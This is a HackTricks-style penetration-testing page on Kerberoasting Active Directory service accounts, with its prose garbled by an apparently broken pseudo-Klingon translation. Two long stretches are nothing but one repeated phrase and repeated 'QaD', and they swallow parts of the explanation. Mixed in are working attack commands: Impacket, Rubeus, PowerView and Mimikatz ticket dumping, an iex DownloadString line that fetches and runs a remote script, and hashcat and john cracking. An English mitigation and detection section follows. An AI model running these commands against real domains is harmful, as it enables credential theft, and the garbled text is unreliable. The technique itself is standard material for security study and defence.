# Kerberoast

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) **ghItlh** **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Kerberoast

Kerberoast **QaD** **TGS tickets** **ghItlh** **user accounts** **Active Directory (AD)**, **computer accounts** **Daq**. **TGS tickets** **encryption** **user passwords** **offline credential cracking** **QaD**. **user account** **service** **"ServicePrincipalName"** **property** **Daq**.

**Kerberoasting** **QaD** **TGS tickets** **user-account services** **AD** **Daq**. **user passwords** **encryption** **cracked offline** **QaD**. **ServicePrincipalName** **non-empty** **Daq**. **special privileges** **needed**, **valid domain credentials** **Daq**.

### Key Points:
- **Kerberoasting** **QaD** **TGS tickets** **user-account services** **AD**.
- **user passwords** **encryption** **cracked offline** **Daq**.
- **ServicePrincipalName** **non-empty** **Daq**.
- **special privileges** **needed**, **valid domain credentials** **Daq**.

### **Attack**

{% hint style="warning" %}
**Kerberoasting tools** **RC4 encryption** **attack** **TGS-REQ requests** **Daq**. **RC4** [**weaker**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) **cracked offline** **Hashcat** **AES-128** **AES-256** **Daq**.\
**RC4 (type 23)** **hashes** **start** **`$krb5tgs$23$*`** **AES-256(type 18)** **start** **`$krb5tgs$18$*`**`.`
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Multi-features tools including a dump of kerberoastable users:

**Klingon Translation:**

**Qa'Hom QaD:**
Qa'Hom QaD vItlhutlhlaHchugh, kerberoastable users jop 'ej vItlhutlhlaHchugh tools:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Enumerate Kerberoastable users**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Technique 1: TGS jatlh je, 'ej memory laH jatlh**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Technique 2: Automatic tools**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
QaStaHvIS 'ej 'oH 'e' vItlhutlh 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'oH 'e' vItlhutlh 'ej 'o
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### QaD

**QaD** (QaD) **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD** **QaD
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
**tools** for **kerberoast** attacks can be found here: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

If you find this **error** from Linux: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** it because of your local time, you need to synchronise the host with the DC. There are a few options:

* `ntpdate <IP of DC>` - Deprecated as of Ubuntu 16.04
* `rdate -n <IP of DC>`

### Mitigation

Kerberoasting can be conducted with a high degree of stealthiness if it is exploitable. In order to detect this activity, attention should be paid to **Security Event ID 4769**, which indicates that a Kerberos ticket has been requested. However, due to the high frequency of this event, specific filters must be applied to isolate suspicious activities:

- The service name should not be **krbtgt**, as this is a normal request.
- Service names ending with **$** should be excluded to avoid including machine accounts used for services.
- Requests from machines should be filtered out by excluding account names formatted as **machine@domain**.
- Only successful ticket requests should be considered, identified by a failure code of **'0x0'**.
- **Most importantly**, the ticket encryption type should be **0x17**, which is often used in Kerberoasting attacks.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
To mitigate the risk of Kerberoasting:

- Ensure that **Service Account Passwords are difficult to guess**, recommending a length of more than **25 characters**.
- Utilize **Managed Service Accounts**, which offer benefits like **automatic password changes** and **delegated Service Principal Name (SPN) Management**, enhancing security against such attacks.

By implementing these measures, organizations can significantly reduce the risk associated with Kerberoasting.


## Kerberoast w/o domain account

In **September 2022**, a new way to exploit a system was brought to light by a researcher named Charlie Clark, shared through his platform [exploit.ph](https://exploit.ph/). This method allows for the acquisition of **Service Tickets (ST)** via a **KRB_AS_REQ** request, which remarkably does not necessitate control over any Active Directory account. Essentially, if a principal is set up in such a way that it doesn't require pre-authentication—a scenario similar to what's known in the cybersecurity realm as an **AS-REP Roasting attack**—this characteristic can be leveraged to manipulate the request process. Specifically, by altering the **sname** attribute within the request's body, the system is deceived into issuing a **ST** rather than the standard encrypted Ticket Granting Ticket (TGT).

The technique is fully explained in this article: [Semperis blog post](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
You must provide a list of users because we don't have a valid account to query the LDAP using this technique.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## References
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
